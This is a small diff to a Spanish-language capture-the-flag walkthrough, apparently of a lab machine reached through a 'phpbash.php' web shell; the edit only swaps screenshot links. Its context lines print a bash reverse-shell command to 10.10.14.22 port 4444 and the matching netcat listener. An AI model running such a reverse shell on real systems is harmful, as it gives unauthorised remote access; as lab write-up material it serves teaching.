@@ -76,15 +76,13 @@ Desde `phpbash.php`:
 bash -c "bash -i >%26 /dev/tcp/10.10.14.22/4444 0>%261"
 ```
 
-![phpbash reverse shell](./images/phpbash-shell.png)
-
 En el atacante:
 
 ```bash
 nc -lvnp 4444
 ```
 
-![Shell www-data](./images/www-data-shell.png)
+![Shell www-data](./images/phpbash-shell.png)
 
 
 ##### Resultado:
